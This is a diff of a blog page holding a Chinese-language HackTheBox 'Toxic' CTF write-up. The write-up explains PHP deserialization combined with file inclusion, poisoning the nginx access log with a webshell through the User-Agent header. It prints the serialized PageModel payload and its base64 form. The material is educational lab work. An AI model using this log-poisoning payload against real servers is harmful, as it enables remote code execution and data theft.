@@ -2,8 +2,8 @@
 </script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">忘返</a></h1></div><p class="m-desc">且随我提灯照胆看江山。</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/links/">友链</a></li><li><span class="dot">●</span><a href="/Tips/">Tips</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">HackTheBox Toxic WriteUP</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2023/08/23/HackTheBox-Toxic-WriteUP/">2023-08-23</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
 <p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p>
 </blockquote>
-<p><img src="/image.png" alt="Toxic"></p>
-<p><img src="/image-1.png" alt="Web"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image.png" alt="Toxic"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-1.png" alt="Web"></p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>源代码很简单，只有两个PHP文件</p>
 <pre><code class="php">//index.php
 
@@ -46,17 +46,17 @@ class PageModel
 </code></pre>
 <p>很显然，是一个PHP反序列化+文件包含的漏洞利用。</p>
 <p>这里就需要找到一个可包含的日志文件，我们可以在<code>nginx.conf</code>中找到AccessLog文件的位置。</p>
-<p><img src="/image-2.png" alt="AccessLog"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-2.png" alt="AccessLog"></p>
 <h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用<code>User-Agent</code>写入WebShell：</p>
-<p><img src="/image-3.png" alt="UA"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-3.png" alt="UA"></p>
 <p>构造包含AccessLog的序列化数据：</p>
 <pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;
 //base64encode
 Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
 </code></pre>
 <p>利用WebShell获得文件名和Flag</p>
-<p><img src="/image-4.png" alt="FileName"></p>
-<p><img src="/image-5.png" alt="Flag"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-4.png" alt="FileName"></p>
+<p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-5.png" alt="Flag"></p>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
 <ul>
